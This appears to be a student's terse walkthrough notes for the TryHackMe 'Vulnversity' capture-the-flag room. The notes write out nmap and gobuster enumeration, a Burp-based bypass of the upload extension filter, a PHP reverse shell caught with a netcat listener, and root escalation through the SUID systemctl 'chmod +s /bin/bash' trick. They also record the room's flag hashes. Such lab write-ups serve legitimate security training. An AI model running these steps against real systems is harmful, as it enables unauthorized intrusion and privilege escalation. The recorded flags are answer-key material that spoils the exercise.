
https://tryhackme.com/room/vulnversity

#Vulnerability  #Networking 

```
10.10.x.x

# Nmap
-sV   versions
-p    ports
-Pn   disable host discovery and scan for open ports
-A    OS detection and version
-sC   scan with defaults
-v    verbose mode
-sU   UDP port scan
-sS   TCP SYN port scan

nmap -A -sV $ip

21/ftp
22/ssh
139/smbd Samba 3.x
445/smbd Samba 4.3.11
3128/http-proxy Squid http proxy 3.5.12
3333/http  Apache/2.4.18

# operating system most likely running= ubuntu

```

port enumeration with Gobuster
- brute force URI directories and files
- ` sudo apt install gobuster `

```
# Attackbox   /usr/share/wordlists/dirbuster/directory-list-1.0.txt

-e     print full URLs in your console
-u     target URL
-w     path to wordlist
-U     username
-P     password
-p x   proxy to use for requests
-c     http cookie 

gobuster dir -u http://10.10.202.23:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 

/images
/css
/js
/fonts
/internal

# go to the http://10.10.202.23:3333/internal/

```

compromise the webserver

```
# upload files on /internal/
# uploading a .php file to exploit a server
# nano phpext.txt > .php .php3 .php4 .php5 .phmtl

# start Burp Suite Intruder and foxyproxy

upload a file > send to intruder
filename="shell.txt"  changes to "shell$.php$"
Burp Suite Payloads upload the shell.txt > run attack

.phtml has different length

extension allowed in .phtml

get PHP reverse shell -- https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

# edit file to have 
# rename the file  php-reverse-shell.phtml
http://10.10.202.23:3333
1234

10.10.10.10

nc -lvnp 1234

Upload your shell and navigate to 
http://10.10.202.23:3333/internal/uploads/php-reverse-shell.phtml

http://10.10.202.23:3333/internal/uploads/
	see the php-reverse-shell.phtml
	click on file === rev shell!!!

# if the rev shell worked then you get www-data
cd /home/bill

cat user.txt

8bd7992fbe8a6ad22a63361004cfcedb

# Use the command: 
find / -user root -perm -4000 

/bin/systemctl

# need to get root, GTFObins for systemctl 

# SUID
nano sudo.txt

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF

/home/bill$ 

/bin/bash -p

/bin/systemctl link $TF

  

a58ff8579f0a9270368d33a9966c7fd5
```

https://www.youtube.com/watch?v=lITIDEm0DiI

```
`$ TF=$(mktemp).service` `$ Type=oneshot ExecStart=/bin/sh -c "id > /tmp/output" [Install] WantedBy=multi-user.target' > $TF` `$ ./systemctl link $TF` `$ ./systemctl enable --now $TF`
```

